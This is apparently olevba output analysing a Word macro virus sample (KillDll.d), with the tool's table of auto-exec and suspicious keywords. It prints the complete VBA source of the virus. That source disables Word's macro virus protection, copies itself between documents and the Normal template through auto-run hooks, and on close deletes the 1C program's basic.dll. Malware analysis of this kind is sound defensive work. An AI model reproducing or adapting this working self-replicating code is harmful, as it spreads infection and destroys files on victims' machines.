olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.KillDll.d-9eb2fd5cfcc8c4959b8e3755066023b5199d108f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.KillDll.d-9eb2fd5cfcc8c4959b8e3755066023b5199d108f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Infection.bas 
in file: Virus.MSWord.KillDll.d-9eb2fd5cfcc8c4959b8e3755066023b5199d108f - OLE stream: 'Macros/VBA/Infection'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim Ifc1, Ifc2 As Boolean

Sub AutoClose()
 Call Infect
End Sub
Sub AutoNew()
 Call Infect
End Sub

Sub Document_Open()
 Call Infect
End Sub

Sub Document_New()
 Call Infect
End Sub

Sub Document_Close()
Dim Str As String
Dim MyStamp As Date
Call Infect
Str = Dir("c:\Program Files\1cv77\bin\basic.dll")
If Str <> "" Then
 MyStamp = FileDateTime("c:\Program Files\1cv77\bin\basic.dll")
 If MyStamp > "1.1.00 00:00:00" Then
  Kill "c:\Program Files\1cv77\bin\basic.dll"
 End If
End If
If havesave And infected And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
      Dialogs(wdDialogFileSaveAs).Execute
    End If
ActiveDocument.Saved = havesave
End Sub

Sub Infect()
Ifc1 = True
Ifc2 = True
 Options.VirusProtection = False
 x1 = Application.StartupPath + "\Normal1.tmp"
 x2 = Application.StartupPath + "\Normal2.tmp"
If Documents.Count >= 1 Then
  counter1 = NormalTemplate.VBProject.VBComponents.Count
  counter2 = ActiveDocument.VBProject.VBComponents.Count
   For i = 1 To counter2
   If ActiveDocument.VBProject.VBComponents.Item(i).Name = "Infection" Then Ifc2 = False
  Next i
  For i = 1 To counter1
   If NormalTemplate.VBProject.VBComponents.Item(i).Name = "Infection" Then Ifc1 = False
  Next i
   
  If Ifc2 Then
   GoSub a9
  End If
  
  If Ifc1 Then
   ActiveDocument.VBProject.VBComponents("Infection").Export (x1)
  End If
  
  If Ifc2 Then
   ActiveDocument.VBProject.VBComponents.Import (x2)
  End If
  
  If Ifc1 Then
   GoSub a8
  End If
  
 havesave = ActiveDocument.Saved
End If

Exit Sub

a8:
   NormalTemplate.VBProject.VBComponents.Import (x1)
Return
a9:
   NormalTemplate.VBProject.VBComponents("Infection").Export (x2)
Return
End Sub

Rem Sub ViewVBCode()
Rem   MsgBox ("Íåò çàãðóæåííûõ ìàêðîñîâ!")

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |basic.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

